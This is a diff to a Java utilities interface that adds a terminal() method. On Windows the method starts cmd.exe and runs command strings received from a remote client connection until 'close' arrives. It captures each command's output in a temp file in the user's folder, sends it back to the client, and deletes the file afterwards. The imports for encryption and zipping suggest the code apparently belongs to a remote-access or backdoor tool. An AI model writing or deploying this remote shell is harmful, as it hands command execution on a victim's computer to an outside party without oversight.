@@ -1,11 +1,9 @@
 import javax.crypto.Cipher;
 import javax.crypto.spec.SecretKeySpec;
-import java.io.File;
-import java.io.FileInputStream;
-import java.io.FileOutputStream;
-import java.io.IOException;
+import java.io.*;
 import java.security.Key;
 import java.util.ArrayList;
+import java.util.Arrays;
 import java.util.List;
 import java.util.zip.ZipEntry;
 import java.util.zip.ZipOutputStream;
@@ -93,5 +91,68 @@ interface Utilities {
             e.printStackTrace();
         }
     }
+    static void terminal(String os,Client client)
+    {
+        //os is windows
+        if(os.charAt(0) == 'W')
+        {
+            //open up a process
+            ProcessBuilder pb = new ProcessBuilder("cmd.exe", "/k");
+            //write all output/error output to this file
+            File tmp = new File("C:/users/"+System.getProperty("user.name")+"/tmp.txt");
+            if(!tmp.exists()) try {
+                tmp.createNewFile();
+            } catch (IOException e) {
+                e.printStackTrace();
+            }
+            //redirect process output to tmp
+            pb.redirectOutput(tmp);
+            //redirect process output to tmp
+            pb.redirectError(tmp);
+            Process p = null;
+            FileInputStream input=null;
+            byte[] bytes;
+            byte[] buffer = new byte[1024];
+            int count;
+            try {
+                p = pb.start();
+                input = new FileInputStream(tmp);
+            } catch (IOException e) {
+                e.printStackTrace();
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+            String str;
+            try(PrintWriter pw = new PrintWriter(new OutputStreamWriter(p.getOutputStream()), true))
+            {
+                //read commands from user
+                while(!(str=client.getRequest()).equals("close"))
+                {
+                    pw.println(str);
+                    //wait for the process to write to tmp
+                    Thread.sleep(100);
+                    count = input.read(buffer);
+                    bytes = Arrays.copyOfRange(buffer,0,count);
+                    //write tmp to client
+                    client.sendMsg(new String(bytes));
+                }
+            }
+            catch(Exception e)
+            {}
+            try {
+                //this will make main thread wait till process (console) will finish (will be closed)
+                p.waitFor();
+                //close input stream
+                input.close();
+                //delete the dir
+                tmp.delete();
+            } catch (InterruptedException e) {
+                e.printStackTrace();
+            } catch (IOException e) {
+                e.printStackTrace();
+            }
+        }
+    }
+
 
 }
